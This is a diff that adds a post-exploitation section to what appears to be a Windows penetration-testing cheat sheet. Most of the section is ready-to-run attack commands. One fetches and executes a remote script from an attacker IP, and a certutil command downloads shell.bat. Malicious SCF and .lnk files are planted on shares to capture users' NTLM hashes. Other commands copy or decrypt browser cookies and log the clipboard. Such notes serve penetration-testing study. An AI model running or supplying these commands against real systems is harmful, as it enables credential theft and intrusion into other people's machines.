@@ -179,3 +179,173 @@ C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*
 ```
 
+## Additional Techniques
+
+### Interacting with Users
+
+#### Process Command Lines
+
+##### Monitoring for Process Command Lines
+
+There may be scheduled tasks or other processes being executed which pass credentials on the command line.The Script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
+
+```
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+```
+##### Running Monitor Script on Target Host
+
+We can host the script on our attack machine and execute it on the target host as follows
+
+```
+PS C:\> IEX (iwr 'http://<ip>/procmon.ps1') 
+```
+
+#### SCF on a File Share
+
+##### Malicious SCF File
+
+let's create the following file and name it something like @Inventory.scf .  We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share
+
+```
+[Shell]
+Command=2
+IconFile=\\<ip>\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+``` 
+
+#### Capturing Hashes with a Malicious .lnk File
+
+Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+### Pillaging
+
+Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details,passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
+
+#### Get Installed Programs via PowerShell & Registry Keys
+
+```
+PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+
+#### Abusing Cookies to Get Access
+
+##### Copy Firefox Cookies Database
+
+```
+PS C:\> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+
+>> We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database
+
+##### Cookie Extraction from Chromium-based Browsers
+
+The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer
+
+[SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format
+
+```
+PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
+>> the cookie file path that contains the database is hardcoded in SharpChromium, and the current version of Chrome uses a different location
+
+```
+PS C:\> Invoke-SharpChromium -Command "cookies <site.com>"
+```
+
+#### Clipboard
+
+We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below
+
+```
+PS C:\> Invoke-ClipboardLogger
+```
+>> The script will start to monitor for entries in the clipboard and present them in the PowerShell session
+
+>> User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging
+
+### Miscellaneous Techniques
+
+#### LOLBAS
+
+The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft for example [certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
+
+##### Transferring File with Certutil
+
+```
+PS C:\> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+
+##### Encoding File with Certutil
+
+```
+C:\> certutil -encode file1 encodedfile
+```
+
+##### Decoding File with Certutil
+
+```
+C:\> certutil -decode encodedfile file2
+```
+
+#### Always Install Elevated
+
+##### Enumerating Always Install Elevated Settings
+
+```
+PS C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+>> if key is set to 0x1 then always install elevated exist
+
+#### Scheduled Tasks
+
+##### Enumerating Scheduled Tasks
+
+```
+C:\>  schtasks /query /fo LIST /v
+```
+
+##### Enumerating Scheduled Tasks with PowerShell
+
+```
+PS C:\> Get-ScheduledTask | select TaskName,State
+```
+>> By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\Windows\System32\Tasks, which standard users do not have read access to
+
+#### User/Computer Description Field
+
+##### Checking Local User Description Field
+
+```
+PS C:\> Get-LocalUser
+```
+
+##### Enumerating Computer Description Field with Get-WmiObject Cmdlet
+
+```
+PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description
+```
+
+
